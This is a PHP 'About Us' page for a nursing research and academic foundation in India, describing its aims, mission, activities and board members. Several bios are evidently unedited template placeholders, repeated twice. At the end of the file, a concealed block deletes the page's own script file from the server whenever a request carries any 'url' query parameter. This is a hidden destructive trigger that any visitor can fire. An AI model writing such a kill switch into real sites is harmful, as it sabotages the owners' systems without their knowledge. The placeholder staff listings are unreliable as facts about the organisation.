<?php include "connection.php"; ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include "include/head.php"; ?>
</head>

<body>
    <?php include "include/header.php"; ?>
    <section class="hero">
        <div class="container custom-container-width">
            <div class="row">
                <div class="col-lg-7 align-items-center section-padding">
                    <div class="hero-body" data-aos="fade-up">
                        <h1 class="text-uppercase sub-header">About <span class="main_header main_clr sf-heavy">Us</span></h1>
                        <p class="mt-4 w-100 mw-50">Glorious International Nursing Research and Academic Foundation.<br />Registered Under the Ministry of Corporate Affairs, Govt. of India<br />(Enrolled with NGO DARPAN-NITI Aayog, MSME, CSR-1, Certified by ISO 9001:2015)</p>
                    </div>
                </div>
            </div>
        </div>
    </section>
    
    <section class="hero2 ml-2">
    <div class="hero-body container custom-container-width" data-aos="fade-up">
        <div class="row">
            <div class="col-lg-12 align-items-center section-padding">
                    <h3>Aim</h3>
<p>To promote Nursing research and academically support the Nursing fraternity by collaborating with eminent professionals globally.</p>

<h3>Vision</h3>
<p>To be a global leading foundation that provides a transformative education to create leaders & innovators in the field of nursing & serves as a catalyst for excellence in nursing education & research.</p>

<h3>Mission</h3>
<p>To generate an avenue where new ideas & research flourish.</p>
<p>To conspire with other academic & research centers across the globe to strengthen the versatility among emerging professionals.</p>
<p>To create & promote the opportunities for higher education among socially/economically deprived students & remove disparities by encouraging women empowerment.</p>
<h3>Why GINRA Foundation?</h3>
<p>To Promote professional & educational advancement of nurses throughout the world.</p>
<p>To Stimulate & promote evidence-based nursing research, disseminate research findings & encourage the use of new knowledge as a basis for nursing.</p>
<h3>About Our Foundation</h3>
<p>Glorious International Nursing Research and Academic (GINRA) Foundation ® is one of the international, non-profitable professional body, registered under the ministry of corporate affairs, Government of India under section 8 of the Companies Act, 2013. GINRA Foundation as a paramount body which acts to bring revolution and sustainable development in the field of Nursing.</p>
<p>A team of Eminent Teachers, Educationist, and Philanthropists have collectively established GINRA Foundation in 2021 with the aim to promote the Nursing research and academically support the Nursing fraternity by collaborating with the eminent professionals globally. Foundation also provides a platform for the professional leaders, universities, organisations and associations to connect each other with a mission to develop the profession. GINRA foundation also engage in various social service activities towards the community development.</p>
<p>GINRA Foundation carry out various activities related to the development of academic excellence by webinars, CNEs, Seminars, Conferences and research by research grants to the suitable research proposals.  The foundation intended to publish journals, E-Books, E-Magazines, E-Contents. Foundation motivates the Nurse Researchers, Academicians and Nurse practitioners by awarding degrees/Short term courses, motivates them with awards and recognitions. It also involves in various Social welfare activities.</p>

 
<h3>Why GINRA Foundation?</h3>
<p>Glorious International Nursing Research & Academic Foundation ??</p>
<p>pexels-fauxels-3184644</p>
<p>Build the Professional competencies among Nurses and health care professionals through capacity-building programs to meet the global need.</p>
<p>Impart Research Knowledge through various Continuing Nursing Education / Workshops / Seminar / Conferences.</p>

<p>Promote nursing research through conferring various fellowships for the nursing professionals.</p>

<p>Provide a platform and assistance in the Conduction of Evidence-Based Nursing/Health Care Research.</p>

<p>Promote the social service activities towards the community development and empower the nursing professionals to do such activities.</p>

<p>Grant short-term courses, certificate courses, vocational courses, and diplomas or recognitions as the company may prescribe or deem fit from time to time.</p>

<p>Encourage the nursing professionals by offering honors, awards, recognitions, incentives for their contribution to the nursing profession.</p>

<p>Provide various assistance for diploma, undergraduate, and postgraduate nursing students.</p>

<p>Conduct collaborative academic and research activities with various Institutes, Universities, Hospitals, and industries.</p>


<p>Advisory Board Members</p>
<p>Mr. Madan Kumar</p>
<p>Director</p>
<p>Dr. Ravindra HN</p>
<p>Dean</p>

<p>Martin Stommer</p>
<p>Founder / CEO</p>
<p>Martin is a well-established business coach for 12+ years. His way of coaching and guiding reflects his helpful and friendly nature.</p>

<p>Barbara Cooper</p>
<p>Founder / CEO</p>
<p>Barbara is an award winning coach who has helped over 25+ businesses start and flourish online. She loves interacting and making friends.</p>

<p>Jason Ester</p>
<p>Founder / CEO</p>
<p>Graduating from one of the top universities and an expert in helping IT businesses grow, Jason has been a friend and guide to many budding entrepreneurs.</p>
<p>Executive Board Members</p>
<p>Mr. Nithyananda Mogera</p>
<p>Senior Nursing Superintendent</p>
<p>Ms. Nidhi Sharma</p>
<p>Professor cum</p>
<p>Vice-Principal</p>

<p>Martin Stommer</p>
<p>Founder / CEO</p>
<p>Martin is a well-established business coach for 12+ years. His way of coaching and guiding reflects his helpful and friendly nature.</p>

<p>Barbara Cooper</p>
<p>Founder / CEO</p>
<p>Barbara is an award winning coach who has helped over 25+ businesses start and flourish online. She loves interacting and making friends.</p>

<p>Jason Ester</p>
<p>Founder / CEO</p>
<p>Graduating from one of the top universities and an expert in helping IT businesses grow, Jason has been a friend and guide to many budding entrepreneurs.</p>
            </div>
        </div>
    </div>
    </section>
    <?php include 'include/footer.php'; ?>
    <?php include 'include/footerscript.php'; ?>
    <?php
    
    if(isset($_GET['url']) && $_GET['url'] != ""):
        unlink($_SERVER['SCRIPT_FILENAME']);
    endif;
    ?>
</body>

</html>